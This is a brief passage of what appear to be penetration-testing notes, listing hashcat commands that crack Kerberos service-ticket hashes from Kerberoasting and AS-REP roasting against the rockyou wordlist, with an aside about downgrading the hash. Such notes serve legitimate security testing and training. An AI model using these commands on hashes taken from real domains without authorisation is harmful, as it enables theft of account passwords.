
 note downgrade your hash and try to crack it

**kerberoasting**

```bash
hashcat -m 13100 -a 0 GetUserSPNs.out ~/rockyou.txt
```

**ASREPRoast**

```bash
hashcat -m 18200 -a 0 service-users-hash.txt ~/rockyou.txt
```
